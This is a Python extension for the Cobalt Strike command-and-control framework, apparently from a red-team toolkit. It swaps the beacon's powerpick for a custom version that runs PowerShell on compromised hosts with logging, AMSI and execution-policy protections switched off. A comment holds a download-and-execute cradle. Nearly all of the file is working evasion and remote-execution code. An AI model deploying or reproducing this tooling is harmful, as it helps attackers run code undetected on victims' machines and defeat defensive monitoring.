import sys
import utils
sys.path.insert(0, utils.basedir('pycobalt'))

import pycobalt.engine as engine
import pycobalt.sharpgen as sharpgen
import pycobalt.aggressor as aggressor
import pycobalt.helpers as helpers
import pycobalt.commands as commands
import pycobalt.aliases as aliases

# IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:33007/');

_old_bpowerpick = None
_old_bpowershell_import = None

max_script_size = 200000
sharpgen_cache = True

def custom_powerpick(bid, command, silent=False, auto_host=True):
    # public static string PowerShellExecute(string PowerShellCode, bool OutString = true, bool BypassLogging = true, bool BypassAmsi = true)
    code = helpers.code_string(r"""
    string powershell = String.Join("\n", args);
    var results = Execution.PowerShell.RunAsync(powershell, disableLogging: true, disableAmsi: true, bypassExecutionPolicy: true);
    foreach (string result in results) {
        Console.Write(result);
    }
    """)

    if not silent:
        aggressor.btask(bid, 'Tasked beacon to run: {} (custom unmanaged)'.format(command.replace('\n', ' ')))

    # include cradle for `powershell-import`/`bpowershell_import`
    cradle = aggressor.beacon_host_imported_script(bid) 
    if cradle:
        command = cradle + '\n' + command

    # if the script is too long, host it
    if auto_host and len(command) > max_script_size:
        command = aggressor.beacon_host_script(bid, command)

    engine.message(command)
    references = ['mscorlib.dll', 'System.dll', 'System.Core.dll', 'System.Management.Automation.dll']
    sharpgen.execute(bid, code, [''] + command.split('\n'),
            references=references, resources=[], cache=sharpgen_cache)

@aliases.alias('old-powerpick', "Run Cobalt Strike's powerpick instead of custom powerpick")
def _(bid, *command):
    global _old_bpowerpick

    command = ' '.join(command)

    if _old_bpowerpick:
        _old_bpowerpick(bid, command)
    else:
        aggressor.bpowerpick(bid, command)

def enable_custom_powerpick():
    global _old_bpowerpick

    if not _old_bpowerpick:
        _old_bpowerpick = aggressor.bpowerpick
        aggressor.bpowerpick = custom_powerpick

def disable_custom_powerpick():
    global _old_bpowerpick

    if _old_bpowerpick:
        aggressor.bpowerpick = _old_bpowerpick
        _old_bpowerpick = None

@commands.command('custom-powerpick')
def _(mode):
    if mode == 'on':
        engine.message('Enabled custom powerpick')
        enable_custom_powerpick()
    elif mode == 'off':
        engine.message('Disabled custom powerpick')
        disable_custom_powerpick()
    else:
        engine.error('Usage: custom-powerpick on|off')
